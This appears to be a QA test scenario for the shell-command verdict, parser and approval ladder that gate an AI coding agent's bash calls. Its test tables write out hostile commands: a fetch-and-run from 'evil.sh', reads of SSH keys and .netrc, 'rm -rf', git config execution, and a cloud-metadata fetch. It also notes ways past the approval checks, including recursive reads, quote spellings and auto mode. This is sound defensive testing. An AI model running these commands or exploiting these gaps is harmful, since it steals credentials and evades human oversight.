# Scenario: the shell term arm, and who is allowed to decide about it

**What it exercises:** `Shell::Parse` (`parse.rb:24`, the tree-sitter reading and its 4096-byte
cap), `Shell::Verdict` (`verdict.rb:52`, the three-valued `allow`/`deny`/`abstain` and the six
program families behind it), `Shell::Pipeline` (`pipeline.rb:65`, the argv-array runner and its
`STDIN_SAFE` downstream predicate), `Shell::Out`, `Approval::Escalation::Triage` over the term it
resolved (`escalation.rb:501-518`), the `Rules` rung's `Approval::Rule::Call` (`rule.rb:101`),
`Approval::Risk`, `Sensitivity::Policy::PATH_FIELDS` (`policy.rb:64-79`, which carries
`"bash" => "cwd"` and so never sees an argv word), `Tools::Bash#perform` (`bash.rb:139-147`, the
arm chooser), and `Exec::Local` / `Exec::Docker` as the two backends a term can land on.

**The question it answers:** `lib/lain/shell/` is ~1,300 lines deciding, per gated call, whether a
command runs as reconstructed argv with no shell anywhere or as a string handed to `sh -c` — and
it has **zero** manual-QA coverage. No other scenario names `Shell::Verdict`, `Parse`, `Pipeline`,
the term arm or arm selection; the five scenarios that touch `bash` use it as a vehicle for
something else. So: does the parse boundary refuse what it claims to refuse, does the verdict
abstain where it says it abstains, **can a driver tell from the outside which arm ran**, and does
the deterministic approval this subsystem exists to enable actually exist yet?

**Cost:** cheap. §1, §2, §4a, §6 and §10 are **zero-model** — `/ruby` and a shell, no turns at all.
§0, §3, §4b, §5, §7, §9 and §11 each drive at least one gated `bash` call, so each needs a model
behind it: **no CLI path dispatches a tool without a turn**, which is the same constraint
`secret-boundary.md` records. Budget **under fifteen completions** for the whole thing on the local
arm. Nothing here needs a remote provider, a forge, or a paid key.

**Needs:** a throwaway tree (§0 builds one); the local bench up per `bench.md`; `docker` on `PATH`
for §9 only, which is skippable and says so. §4b and §5 write fake keys under the sandbox `HOME` —
**read `secret-boundary.md` §0's four-export `HOME` redirect before driving either**, because
following them literally against an un-redirected `HOME` writes into the operator's real `~/.ssh`.

---

## ⚠️ Read this before recording anything as a defect

**`planning/specs/chunk-shell-term-approval.md` is `status: draft` and unlanded.** This document is
written against the tree as it stands, and it splits every section into one of two kinds:

- **DRIVABLE NOW** — the behaviour is shipped, the expected strings below were **measured** against
  the real objects on 2026-08-27, and a disagreement is a finding.
- **BLOCKED ON <card>** — the behaviour is what the chunk *plans*. The section states what is true
  today (which is usually "it does not happen"), names the card it waits on, and says what to
  drive once that card lands. **Driving a blocked section against today's tree and filing the
  absence as a defect is the single most likely way to waste this scenario's first round.**

`README.md`'s standing warning applies to every literal in here regardless: a scenario written from
the code rather than from a round makes every expected string, every record name and every ceiling
a **prediction**. The first round to drive this should expect to correct the document as much as to
find defects, **and should say which it did** — a wrong expectation and a real defect look identical
from the driver's seat, and telling them apart is that round's real job. The measured tables below
are the exception and are marked as such; they came from `bundle exec ruby -Ilib` against
`lib/lain/shell/` on this box, not from reasoning.

## The three postures, named once, because they decide differently

Every section below says which posture it means. A driver who conflates them will file a false
finding, and the shapes are close enough that it is easy.

| posture | what adjudicates | what this scenario's subject does there |
|---|---|---|
| **attended** (`plan`, `accept_edits`, `accept_all`) | the `[Triage, Rules, Surfaces]` ladder (`escalation.rb:145`) | everything here is live |
| **`/mode auto`** | `Effect::Handler::Gate::ApproveAll` (`gate.rb:32-34`), which **replaces** the ladder | the ladder never runs, so **no rung is journalled at all** — see §11 |
| **unattended** (no queue) | a one-rung `Unattended` deny-all ladder (`switchboard.rb:265,385-396`) | every gated call is denied before any of this is consulted |

`plan` is a fourth thing worth stating separately: it is `deny_all` over a read-only permit set
**that does not contain `bash`**, so a command typed at the floor is refused by the *posture* and
never reaches the ladder. Recording that as "the rung refused" voids the section. **The round's
default for everything below is `accept_edits`.**

---

## 0 — The fixture, and the one command that tells the arms apart

**DRIVABLE NOW.** Costs one turn.

```bash
T="$(mktemp -d)/shellqa"; mkdir -p "$T"; cd "$T"; git init -q .
printf 'hello\nworld\nthird\n' > README.md
printf 'alpha\nbeta\n'         > notes.txt
```

Bring the cockpit up on `$T` at `accept_edits`, per `method.md`.

**The arm oracle, and it is the thing that makes this whole scenario checkable.** `Tools::Bash`
picks its arm silently (`bash.rb:139-141`: `decision.allow? ? decision.term : input.command`) and
**journals nothing about the choice** — that record is T5/T7's work and does not exist yet (§8). So
until it does, the only way to know which arm ran is a command whose two arms *disagree*, and
`Shell::Pipeline`'s class doc names exactly one such family: a **shell builtin with no binary on
disk**.

```
you> run: exit 3
```

**Measured, both arms, on this box:**

| arm | what `Tools::Bash.render_output` produces |
|---|---|
| term (`Shell::Pipeline`) | `exit status: 127` and `lain: exit: command not found` on stderr |
| string (`sh -c`) | `exit status: 3`, both streams empty |

`Shell::Verdict.new.call("exit 3")` is an **allow** carrying `[["exit", "3"]]`, so a healthy tree
answers **127**. **A `3` here means the term arm was not taken** — which is either a wiring
regression or a verdict that stopped allowing, and §2 tells you which.

**What wrong looks like:** this is the one section whose *pass* is the surprising answer. `127` and
`command not found` read like a broken sandbox and are the correct result; a driver who "fixes" it
by concluding the tree is misconfigured has thrown away the instrument the rest of the scenario
uses. `pipeline.rb:58-65` states the divergence as deliberate and says there is a spec for it.

Keep `exit 3` as the arm probe for every later section. Do **not** substitute `cd /tmp` or
`umask` — both also allow, but whether a binary for them exists on disk is a property of *this
box*, and the point of an oracle is that it does not depend on one.

## 1 — The parse boundary: what `Shell::Parse` accepts, and what it refuses to have parsed

**DRIVABLE NOW, zero model calls.** `/ruby` inside the live session, per `method.md`'s note that a
constant read through `/ruby` is a claim about the process under test where a constant read from a
file is only a claim about the repo.

```bash
$QA/drive.sh '/ruby Lain::Shell::Parse::MAX_BYTES' 6 30 >/dev/null; $QA/peek.sh 6
$QA/drive.sh '/ruby Lain::Shell::Parse::OPERATORS' 6 30 >/dev/null; $QA/peek.sh 6
$QA/drive.sh '/ruby Lain::Shell::Parse.new.call("echo " + "a" * 5000).breakages' 6 30 >/dev/null; $QA/peek.sh 6
```

Expected, measured:

- `MAX_BYTES` → `4096`
- `OPERATORS` → `["|", "||", "&&", ";", "&"]`
- the over-cap parse → `[#<data Lain::Shell::Parse::Breakage kind=:too_long, detail="over the 4096-byte cap">]`,
  with `broken?` **true** and `covered?` **false**

**The property that matters is the second one, not the first.** A refusal reports *both* broken and
not-covered, deliberately (`parse.rb:16-21`), so that "nothing was parsed" can never read as
"every byte accounted for". Check it explicitly:

```bash
$QA/drive.sh '/ruby (r = Lain::Shell::Parse.new.call("echo " + "a" * 5000); [r.broken?, r.covered?, r.uncovered.size])' 6 30 >/dev/null; $QA/peek.sh 6
```

**A `covered?` of `true` on a refused parse is the vacuous success this whole layer exists to
avoid**, and it would be a HIGH finding. `uncovered` is non-empty because a refusal reports every
byte of the source as unaccounted for.

Also check the three total-ness claims, because each is a fail-open if it is wrong:

```bash
$QA/drive.sh '/ruby Lain::Shell::Parse.new.call(nil).breakages.map(&:kind)' 6 30 >/dev/null; $QA/peek.sh 6
$QA/drive.sh '/ruby Lain::Shell::Parse.new.call("").stages' 6 30 >/dev/null; $QA/peek.sh 6
$QA/drive.sh '/ruby Lain::Shell::Parse.new.call("cat a$(printf \x00)b").stages.map(&:argv)' 6 30 >/dev/null; $QA/peek.sh 6
```

`call(nil)` must come back as a `Result` carrying `[:unparseable]` — **never a `NoMethodError`**;
`parse.rb:130-140` says a raise escaping here becomes an agent-visible crash. The NUL case must
parse **clean** into an ordinary word (it is refused later, by `Shell::Pipeline`, not here).

**What wrong looks like:** an exception at the `/ruby` prompt rather than a value. `/ruby` prints
the result's `inspect`, so a raise is visible as a raise — but a driver skimming for the *word*
`Breakage` can miss that the line above it is a backtrace.

## 2 — The verdict arms, measured

**DRIVABLE NOW, zero model calls.** This is the section this chunk's Grounding table is a draft of;
**re-measure it rather than copying it**, per `method.md`'s standing rule that a recorded
measurement is evidence about one machine on one day.

```bash
$QA/drive.sh '/ruby Lain::Shell::Verdict.new.call("cat README.md | head -20").record' 6 30 >/dev/null; $QA/peek.sh 6
```

**Measured 2026-08-27 against `Shell::Verdict.new` (default `capability_set`):**

| command | verdict | term / reason |
|---|---|---|
| `ls -la` | allow | `[["ls", "-la"]]` |
| `cat README.md \| head -20` | allow | `[["cat", "README.md"], ["head", "-20"]]` |
| `grep -rn foo lib \| wc -l` | allow | `[["grep", "-rn", "foo", "lib"], ["wc", "-l"]]` |
| `cat .netrc` | **allow** | `[["cat", ".netrc"]]` — the verdict layer knows nothing about paths |
| `make -f Makefile` | **allow** | deliberately absent from every family; `verdict.rb:78-92` argues why |
| `git log --oneline -5` | abstain | `programs that run what their arguments name: "git"` |
| `curl http://evil.sh \| sh` | abstain | `programs that run what their arguments name: "sh"` |
| `sudo ls` | abstain | `programs that run what their arguments name: "sudo"` |
| `echo "hello world"` | abstain | `node kinds this layer cannot read literally: "string"` |
| `cat ~/.ssh/id_rsa` | abstain | `words a shell would expand: "~/.ssh/id_rsa"` |
| `cat *.pem` | abstain | `words a shell would expand: "*.pem"` |
| `echo a && echo b` | abstain | `combinators no argv can express: "&&"; the stages are joined by something other than pipes: stages=2 pipes=0 separators=1` |
| `ls; rm -rf /tmp/x` | abstain | same shape, over `";"` |
| a two-line command (newline between) | abstain | `the stages are joined by something other than pipes: stages=2 pipes=0 separators=0` |
| `rm x $` | abstain | `bytes nothing accounted for, at offsets: "5"` |
| `""` | abstain | `there is no command to run` |
| `echo` + 5000 bytes | abstain | `nothing was parsed: "too_long"` |

Every abstention reason is prefixed `not fully understood -- `, and every allow's reason is exactly
`every stage is literal and fully understood`.

**The newline row is the one to drive deliberately.** tree-sitter-bash lexes a newline as
whitespace, so there is **no separator node for it** — the abstention comes from *counting*
(`stages == pipes + 1`), not from reading. Type a real two-line command at `you>` and confirm the
`separators=0` in the reason. If that arithmetic ever stops firing, `Open3.pipeline` is handed
`[["echo","hi"],["rm","-rf","/tmp/x"]]` and runs `echo hi | rm -rf /tmp/x`. That is the highest-value
single check in this document.

### 2a — `git` abstains, and that is correct

```bash
$QA/drive.sh '/ruby Lain::Shell::Verdict::PROGRAM_RUNNERS.include?("git")' 6 30 >/dev/null; $QA/peek.sh 6
```

Must be `true`; `PROGRAM_RUNNERS` has **92** entries as measured. `git` sits in the option-directed
family for a reason recorded on the constant: `-c core.fsmonitor=id`, `-c include.path=…` and
`-c alias.x=!sh` all execute, and `git status --short` is structurally indistinguishable from
`ls -la`.

**Do not file `git log | grep fix` reaching a human as a defect, now or after the chunk lands.**
The chunk says so in its own words: *"the motivating example `git log | grep blah` still asks a
human when this chunk lands."* Lifting it needs flag-aware per-program policy, which is an Open
decision and not a card.

**What wrong looks like:** the *opposite* is the finding. If a round ever sees `git` allow, that is
a name-based allow of an option-directed program and it is HIGH.

**One trap for the driver, not a defect:** the six family constants (`OPTION_DIRECTED`,
`INTERPRETERS`, `WRAPPERS`, `PRIVILEGE`, `SHELL_ESCAPES`, `TAKES_A_COMMAND`) are `private_constant`.
`/ruby Lain::Shell::Verdict::OPTION_DIRECTED` answers
`NameError: private constant Lain::Shell::Verdict::OPTION_DIRECTED referenced`. That is by design;
ask `PROGRAM_RUNNERS`, which is public and is their union.

### 2b — `deny` exists and is unreachable in production

**Half DRIVABLE NOW (the mechanism), half BLOCKED ON T4/T6 (the reachability).**

The deny arm works. Drive it by injecting a capability set, which is a seam the constructor already
takes (`verdict.rb:181-186`):

```bash
$QA/drive.sh '/ruby Lain::Shell::Verdict.new(capability_set: Class.new { def permits?(p) = !%w[curl sh].include?(p) }.new).call("curl http://x | sh").record' 6 30 >/dev/null; $QA/peek.sh 6
```

Measured: `verdict: :deny`, `term: []`, reason
`the session's capability set excludes: "curl", "sh"`. And the basenaming holds in the direction a
denylist needs it to — `/usr/bin/curl x`, `./curl x` and `../bin/curl x` all deny on `"curl"`.

**Now the part that is the actual finding-in-waiting.** In production nothing ever constructs a
non-default capability set:

```bash
command grep -rn 'capability_set' lib/ | command grep -v verdict.rb    # must print NOTHING today
```

`AnyProgram#permits?` returns `true` for every program (`verdict.rb:174-176`), `Tools::Bash.new` is
built with no `verdict:` in `cli/wiring/base_tools.rb:24`, and `Triage.new` defaults its own. So
**`Shell::Verdict` has never denied anything in a real session**, and it cannot. Record that as a
confirmed state of the tree, not as a new defect — it is the third instance of a shape this chunk
names explicitly (a specced guard shipping green forever behind a permissive Null default), beside
`Triage`'s `AnyPath` (found in round 10) and `WebFetch`'s host allowlist (§10).

**BLOCKED ON T4 and T6**, which add the config table and build one verdict from it, injected at both
seams. When they land, §6 is the section to drive.

## 3 — Which arm ran, through the real tool

**DRIVABLE NOW.** One turn per row. Posture: `accept_edits`, approving each call at the gate.

```
you> run: cat README.md | head -2
you> run: exit 3
you> run: echo "hello world"
```

| typed | verdict | expected arm | how you know |
|---|---|---|---|
| `cat README.md \| head -2` | allow | term | output is `hello` / `world`, exit status 0 — but this row alone does **not** discriminate; both arms produce it |
| `exit 3` | allow | term | `exit status: 127`, `lain: exit: command not found` |
| `echo "hello world"` | abstain | string | `exit status: 0`, stdout `hello world` — the quotes are consumed by `sh`, which is the tell that a shell saw it |

**The middle row is the assertion; the outer two are controls.** `method.md`'s list of three ways a
check passes while asserting nothing applies directly here: a pipeline that works proves nothing
about the arm, because the whole design goal is that both arms render byte-identically through
`Tools::Bash.render_output` for everything in the accepted subset.

### 3a — the downstream predicate, from the outside

**DRIVABLE NOW.** `Shell::Pipeline`'s `STDIN_SAFE` is not a denylist — a stage after a pipe must be
*on* the list, and absence is a refusal (`pipeline.rb:80-104`).

```
you> run: cat README.md | tee out.txt
```

Measured: **`exit status: 126`**, stderr `lain: tee: not permitted downstream of a pipe`. The
verdict **allowed** this command — `tee` is on no `Verdict` family — so the refusal comes from the
runner, one layer down, and its status is the one a shell uses for "declined to run". Contrast:

```
you> run: cat README.md | nl
```

allows and runs, because `nl` is on `STDIN_SAFE`.

**What wrong looks like:** `tee` writing `out.txt`. Check the file's absence, not only the message —
a refusal delivered after the write is the same bytes on screen and a different outcome on disk.

**Note the asymmetry deliberately, because it is a limit and not a bug:** `refused_downstream`
applies to `@term.drop(1)` only. Stage 0's argv is nobody's business here — `curl -o FILE`,
`sort -o out in` and `gzip important.log` all reach `allow` and all run. `STDIN_SAFE` answers "safe
under attacker-chosen *stdin*" and says nothing whatever about model-chosen *argv*. A round that
files those three as defects has misread the predicate; say so once, as a known limit, and move on.

## 4 — The `Triage` rung over the term

### 4a — what the rung answers, measured

**DRIVABLE NOW, zero model calls** — but only through a constructed rung, since building an
`Effect::ToolCall` by hand is what it takes to ask the rung directly. Measured 2026-08-27 with a
real `Sensitivity` anchored on a scratch `HOME` holding `.ssh/id_qa` and `.netrc`:

| command | rung verdict | the note in the reason |
|---|---|---|
| `cat $HOME/.ssh/id_qa` | **deny** | `the command's argv names a path no approval may lift: "<P>" is a protected path` |
| `cat ./.netrc` | **deny** | same shape, on `"./.netrc"` |
| `cat .netrc` | **abstain** | `a word matches a protected name but is not written as a path, so this rung only says so: ".netrc" is a protected path` |
| `grep -r . $HOME/.ssh` | **abstain** | `an allow claims the command is literal and fully understood, never that it is safe` |
| `cat README.md \| head -20` | **abstain** | same |

Every one of those reasons is prefixed `shell verdict allow -- ` and suffixed with the verdict's own
reason and then `Shell::Verdict::CLAIM`:
`whether this command is syntactically literal and fully understood -- never whether it is safe to run`.
**That claim rides on every record this subsystem writes**, and a record that has lost it is a
finding on its own — it is the only thing stopping a journal reader from reading an allow as a
safety judgement.

The `deny`/`abstain` split on `.netrc` is `PATHLIKE` (`escalation.rb:437`, `%r{/|\A~}`) and it is
deliberate, with the reasoning at `escalation.rb:420-426`. **The model controls the `./`.** Note
which of the three reasons that comment gives for the downgrade being safe: the first is *"the call
still reaches a human because Triage downgrades every allow anyway"* — a premise **T9 destroys**,
which is why §7's negative control matters more than its positive one.

### 4b — the same rung, through the real binary

**DRIVABLE NOW, one turn.** This is `secret-boundary.md` §5's probe and it belongs to that document
— **drive it there, not here**, and read §5b's thirteen-row table of spellings that defeat the check
before generalising from a pass. What this scenario adds is only the boundary statement:

**The rung reads the term `Shell::Verdict` resolved, and nothing else.** Everything in §2's abstain
column never reaches the path check at all, because there is no term to check. So the rung's reach is
exactly the verdict's allow set, and widening the verdict widens the rung's coverage as a side
effect. That coupling is worth stating in any write-up: the two objects are described as separate
concerns and one of them silently bounds the other.

## 5 — The recursive-read hazard: every word ordinary, the read set not

**DRIVABLE NOW as a demonstration. The rule that must refuse it is BLOCKED ON T9.**

This is the limit the chunk's Intent names in its own words, and it is the reason a term-shaped
approval rule is not simply "approve when nothing classifies protected".

Build the fixture per `secret-boundary.md` §0 (redirect `HOME` first), then, zero-model:

```bash
$QA/drive.sh '/ruby (h = ENV["HOME"]; s = Lain::Sensitivity.new(home: h, cwd: Dir.pwd); ["grep", "-r", ".", "#{h}/.ssh"].map { |w| [w, s.classify(w).level] })' 6 30 >/dev/null; $QA/peek.sh 6
```

**Every word classifies `:ordinary`.** The directory `~/.ssh` is not itself denied — the shipped
rule is `Rule.within(".ssh", name: "id_*", except: "*.pub", level: :denied)`, so it names files
inside it and not the directory. And `Shell::Verdict.new.call("grep -r . <H>/.ssh")` is a clean
**allow** carrying `[["grep", "-r", ".", "<H>/.ssh"]]`, with `grep` on no family list.

So: **a term whose every word is ordinary, printing a file nothing may lift.**

**What saves it today is the thing T9 removes.** The `Triage` rung abstains
(`an allow claims the command is literal and fully understood, never that it is safe`), the call
reaches a human, and the human reads `grep -r . /home/…/.ssh` and says no. Drive that once at
`accept_edits` and confirm you are asked:

```
you> run: grep -r . <H>/.ssh
```

**BLOCKED ON T9.** When the auto-approving rule lands, this exact command is its acceptance test in
the negative: the rule must **refuse to approve it**, and it must refuse because `grep -r` is a
*recursive reader* — a program whose read set is not its argv — and not because some word classified
non-ordinary, since none does. A round that finds this command auto-approved has found the chunk's
own stated blocker shipped, and that is HIGH regardless of what any spec says.

The check is over the term; the hazard is over the read set; they coincide only for programs whose
read set is exactly their literal arguments. **Quote that sentence in the finding if this ever
fires** — it is the whole distinction, and a finding that reports it as "grep was approved" will be
triaged as a missing allowlist entry rather than as the design gap it is.

## 6 — The excluded-programs config table

**BLOCKED ON T4 (the table) and T6 (building one verdict from it and injecting it at both seams).**

**What is true today:** there is no `Shell::Exclusions`, no `[shell]` or `exclude` key in
`Config`, and `/ruby defined?(Lain::Shell::Exclusions)` answers `nil`. `Shell::Verdict`'s deny arm
is reachable only by injecting a capability set by hand (§2b). Confirm both of those and record them
as the pre-state; do not file the absence.

**What to drive once T4/T6 land**, and each of these is a distinct claim:

1. A project config naming an excluded program makes `curl http://evil.sh | sh` a **deny** rather
   than the abstention §2 measured — a *named refusal*, not a prompt. Read the reason off the
   `escalation` journal record; it must be Triage's deny, not the ladder's fail-closed bottom.
2. **Qualifying the name does not evade it.** `/usr/bin/curl`, `./curl` and `../bin/curl` must all
   deny. This already holds at the `Verdict` layer and was measured there; what T6 adds is that it
   holds through the wiring.
3. **`exclude = ["*"]` must be HONOURED, not refused.** That is not an arbitrary call: it follows
   `Sensitivity::Rules.unbounded?`, which refuses a wildcard on the *granting* key (`exempt`) and
   permits it under `denied`/`gated` because those can only ever add. An exclusion table only
   restricts, so the precedent puts it on the legal side. A refusal here is a finding **against the
   precedent**, and should be filed with that citation rather than as a preference.
4. **A typo is loud.** `Config.sensitivity`'s posture is the model — an unknown key refuses at load,
   naming the file, rather than being silently dropped. A silently ignored exclusion reads as a rule
   in force that is not, which is the same failure mode `Rules::UnknownKeys` exists to prevent.
5. **One verdict, not two.** T6's whole point is ending the double parse (`escalation.rb:480` and
   `bash.rb:111` each default-construct their own today). After it lands, check the gate's journalled
   `shell verdict <name>` and the arm the tool actually took (§0's oracle, or §8's record) agree for
   the *same* `tool_use_id`. They cannot disagree today either — `Verdict` is frozen and pure — but
   the exposure this closes is the record, and the record is what a round reads.

## 7 — The rule that approves a fully-allowlisted term

**BLOCKED ON T8 (a `Rule::Call` that carries a term) and T9 (the rule itself).**

**What is true today, and it is worth confirming by hand rather than believing:**

```bash
$QA/drive.sh '/ruby Lain::Approval::Rule::Call.members' 6 30 >/dev/null; $QA/peek.sh 6
```

Answers `[:tool, :input]` — **no term**. `Call.for(tool:, input:)` builds from `effect.input`, so
the `Rules` rung matches on the model's raw string. `Approval::Rule`'s own class comment
(`rule.rb:28-50`) names the hazard: a hand-written prefix rule `command.start_with?("git ")` would
allow `git -c core.fsmonitor=id status`, which executes `id`. **Nothing shipped is exploitable** —
`Remembered` matches an exact call shape, not a prefix — so this is a doctrine that is unenforced,
not a hole. Say it that way.

And the consequence a driver can observe right now, at `accept_edits`:

```
you> run: cat README.md | head -20
```

**You are asked. Every time.** `Triage::Command#judge` routes an allow to `#literal`, which returns
`Ruling.deny` or `Ruling.abstain` and nothing else — its terminal constant is literally named
`NOT_SAFE`. `Ruling.allow` exists at exactly two sites in the ladder: a rule allowed, and a human
approved. **So the term arm decides which arm executes, never whether a human is asked**, and that
is the whole thing this chunk exists to change.

**What to drive once T9 lands:**

- **The positive:** `cat README.md | head -20` and `grep -n foo lib | wc -l` run with **no prompt**,
  and the journal shows a `rules` rung `allow` — not a `surfaces` line, and not a triage abstention
  followed by a silent approval. `/approve` afterwards must answer `no pending approvals`.
- **The negative controls, which matter more.** Each must still reach a human, and for its own
  stated reason:

  | command | must not be auto-approved because |
  |---|---|
  | `grep -r . <H>/.ssh` | recursive reader — read set is not the argv (§5) |
  | `cat .netrc` | denied-by-bare-word; T9 sits *after* Triage, which is what destroys the downgrade's first justification (§4a) |
  | `cat /tmp/evil/cat f` | measured as an **allow** with `/tmp/evil/cat` as argv0 — basenaming is correct for a denylist and unsafe for an allowlist, and T9 must not reuse it |
  | `git log --oneline -5` | abstains at the verdict; the chunk does not lift it |
  | `cat README.md \| tee out.txt` | allowed by the verdict, refused by the runner (§3a) — an approval rule that says yes to a command the runner then refuses is a UX finding at minimum |

  **`cat .netrc` is the one to drive first and file loudest.** `escalation.rb:420-426` gives three
  reasons the bare-word downgrade is safe; the first is that the call reaches a human anyway. Any
  auto-approving rung placed after Triage falsifies it, and the third reason does not cover the gap
  — `PATH_FIELDS["bash"] => "cwd"`, so the pre-read boundary checks the *working directory* and
  never the argv. Confirm that field yourself before driving:

  ```bash
  $QA/drive.sh '/ruby Lain::Sensitivity::Policy::PATH_FIELDS["bash"]' 6 30 >/dev/null; $QA/peek.sh 6
  ```

  It must answer `"cwd"`. If it ever answers something else, the whole shape of this section has
  changed and the constraint T9 was built around has moved.

## 8 — The journal record naming the arm

**BLOCKED ON T5 (the record) and T7 (the bash tool writing it).**

**What is true today:** `Tools::Bash` journals nothing. It holds `invocation.channel` for output
sinks only; the eight tools that do journal take an injected journal at construction, and `Bash` is
not one of them. `ls lib/lain/telemetry/` shows no shell or arm record. Confirm both:

```bash
ls lib/lain/telemetry/ | command grep -i -E 'shell|arm|verdict'   # nothing today
command grep -n 'journal' lib/lain/tools/bash.rb                  # nothing today
```

What *is* journalled is the **gate's** view: `Escalation` writes one record per rung consulted,
`"type" => "escalation"`, carrying `tool`, `tool_use_id`, `verdict`, `rung`, `reason`, `faulted`,
`authority`. The Triage rung's reason begins `shell verdict allow` / `shell verdict abstain`
(`escalation.rb:535-538`), so **the arm is inferable from the gate's record today, for attended
sessions only**. Drive that now and record it as the pre-state:

```bash
ruby -rjson -e 'ARGF.each_line{|l| r=JSON.parse(l) rescue next;
  puts "#{r["rung"]}\t#{r["verdict"]}\t#{r["reason"]}" if r["type"]=="escalation"}' "$JOURNAL"
```

**And note the hole precisely, because it is what T5/T7 are for:** under `/mode auto` the ladder is
never consulted, so **no `escalation` record is written at all** — the experiment record is blind to
arm selection in exactly the posture an unattended bench run uses. §11 drives that.

**What to drive once T5/T7 land:** the arm record appears in **both** postures, for the same
`tool_use_id`, and it agrees with §0's oracle. A record present at `accept_edits` and absent under
`auto` is the same blindness with a new name.

## 9 — A pipeline under `--exec docker`

**Partly DRIVABLE NOW; the fix is BLOCKED ON T3.** Skip the whole section if `docker` is not on
`PATH` and say you skipped it.

Bring a session up with `--exec docker` per `subagents-and-backends.md` §4, then:

```
you> run: cat README.md
you> run: cat README.md | head -2
```

**Today, measured from the code:** a **single-stage** term runs — `Exec::Docker#entrypoint` takes
`term.first` (`docker.rb:152`) and there is a spec pinning it. A **piped** term raises
`Exec::Docker::Unsupported` (`docker.rb:158-161`), which is caught by the blanket
`rescue StandardError` in `Effect::Handler::Live` and reaches the model as a `tool_result` with
`is_error: true` carrying the exception's own message and no class prefix:

```
docker run takes one argv and a pipe needs a shell, so this backend has no shape for a 2-stage term: [["cat", "README.md"], ["head", "-2"]]
```

**That is the current, correct-by-design behaviour, not a defect** — record the exact string, since
T3's whole job is to turn that rescue into a predicate the chooser asks first.

**What wrong looks like:** the pipe *working* under docker today. That would mean something joined
the term back into a string and handed it to a shell, which is exactly the property the term path
exists to protect and `docker.rb:154-156` refuses to do.

**What to drive once T3 lands:** the piped call succeeds, **and** the round records that it
succeeded by **falling back to the model's string**, which `Docker#entrypoint` runs as
`["sh", "-c", command]` *inside* the container. Contained, but the no-shell property is gone on that
path. A round that reports "pipelines work under docker now" without that sentence has recorded a
capability and hidden a rung.

## 10 — `web_fetch` and the destinations no agent should reach

**BLOCKED ON T11. Zero model calls to establish the pre-state.**

```bash
command grep -n 'Tools::WebFetch.new' lib/lain/cli/wiring/base_tools.rb
$QA/drive.sh '/ruby Lain::Tools::WebFetch::ALLOWED_SCHEMES' 6 30 >/dev/null; $QA/peek.sh 6
```

`base_tools.rb` constructs `Tools::WebFetch.new` **with no argument**, and `allowlist_problem`
returns `nil` when the allowlist is nil — "no restriction". `egress_problem` checks the **scheme**
and the **allowlist** and nothing else: there is no address-range check anywhere in the file. So
today `http://169.254.169.254/latest/meta-data/` is an ordinary fetch, subject only to the gate.

This is the third instance of the shape §2b names, and the chunk calls it the only **presently
exploitable** gap it closes — which is why T11 depends on nothing and why this section belongs in
the cheap set the moment it lands.

**What to drive once T11 lands:** the cloud-metadata address, a loopback address and an RFC1918
address each refuse **by name and before the fetch**, and a redirect **into** a blocked range is
refused on the hop rather than followed. The redirect leg is the half that is easy to ship broken:
stand up a local responder returning a `302` to `http://169.254.169.254/` and confirm the refusal
names the *hop's* host. **The check is lexical on the host**, so a public name resolving into a
blocked range is still reachable — record that as a stated limit of the rung, not as a defect.

## 11 — `/mode auto`: everything above is inert

**DRIVABLE NOW.** One of the named exceptions to `method.md`'s standing prohibition on raising the
posture, on the precedent of `repl-commands.md` §6 and `secret-boundary.md` §5. **Scope it to `$T`,
the throwaway tree from §0, and end the section with `/mode !`.**

```
you> /mode auto
you> run: exit 3
you> /approve
```

Four things, then stop:

1. **No prompt.** That is the posture's claim and it is not what this section is about.
2. **Nothing parked.** `auto` **replaces** the ladder — `Mode::Resolution` hands the Gate
   `ApproveAll` — so the queue is still built and `/approve` still drains it; it simply never
   receives anything. `/approve` must answer `no pending approvals`.
3. **No `escalation` records for that `tool_use_id`.** Not a bypassed rung, not a rung that abstained
   — *none*. Grep the journal by the id.
4. **The arm was still chosen.** `Tools::Bash` picks its arm from the verdict regardless of posture,
   so §0's oracle must still read `exit status: 127`. **This is the section's actual finding:** the
   term arm ran, the record cannot say so, and no rung was consulted to say anything either. Under
   `auto`, arm selection is invisible in the experiment record.

**What wrong looks like:** `exit status: 3` here. That would mean the posture changed which *arm*
executes, which nothing is supposed to do — the ladder decides whether a human is asked, and the
verdict decides which arm runs, and they are meant to be independent axes.

**BLOCKED ON T4/T6 and T9, and this is the limit to state in any write-up:** everything the chunk
builds inside the escalation ladder is **inert here**. The exclusion table cannot deny under `auto`,
and the approval rule cannot approve under it, because neither rung is consulted. Do not drive §6's
or §7's checks from this posture and conclude the feature is broken.

Then:

```
you> /mode !
you> /mode accept_edits
```

`!` lands on `plan`, which permits reads only and does not permit `bash` at all — so a command typed
there is refused by the posture, and a driver who leaves the session at the floor will read the next
section's posture refusal as a rung refusal. Confirm the posture report before continuing.

---

## What this scenario does not cover

- **Whether any of it is safe.** `Shell::Verdict`'s own terminal constant says it: *"an allow claims
  the command is literal and fully understood, never that it is safe"*. Everything here is a check
  on a decision procedure, not on an outcome.
- **Program identity.** `PATH` is inherited and uncontrolled (`WorkerEnv` "merges onto the ENV it
  already inherited and never clears ENV first"), and `execvp` honours its order — a shim directory
  prepended to `PATH` is run by both arms. `cat /tmp/evil/cat f` is a measured **allow**. Nothing in
  the parse layer can see this and no section above tests it; the chunk's own Open decisions carry
  the four-rung ladder that would (resolve and record → resolve and constrain → verify a digest →
  control `PATH`), and rung 1 is the cheap one.
- **Aliases and shell functions.** Measured and **not a gap**: non-interactive shells have
  `expand_aliases` off, and an alias defined and used within one parse unit is not expanded
  regardless. All three spellings were driven with `alias cat='echo PWNED'` in play and each printed
  the real file. Recorded here so nobody re-derives it.
- **The thirteen spellings that defeat the `Triage` path check.** `secret-boundary.md` §5b owns
  that table and says the thing that matters about it — *a determined adversary reaches the key by
  adding two quote characters*. **Do not file those one at a time**; they are one known-open with a
  long tail.
- **`Tools::CoreExec` and the lain-core daemon.** Nothing in `lib/` constructs it — the only
  construction in the tree is a spec support file, and `BaseTools.build` does not include it. Its
  term refusal (`core.rb:75-79`) is therefore unreachable from any chat, and so is the tool. A
  section here would be a check that asserts nothing.
- **Piped terms through docker or the daemon.** Out of scope in the chunk by decision, with the
  reason recorded: a container takes one argv and `docker run` has no multi-stage pipe primitive.
- **`Approval::Risk`'s composition hole**, which it names on itself: `ShellString` looks at a
  `command` for metacharacters and `OutsideRoot` looks at path-named fields for escapes, so
  `sudo rm -rf ..` in a `command` field is seen by neither's other half. The real fix is the ladder
  building a `Rule::Call` from a parsed term — which is T8, and until it lands this is a hole with a
  name and no probe.
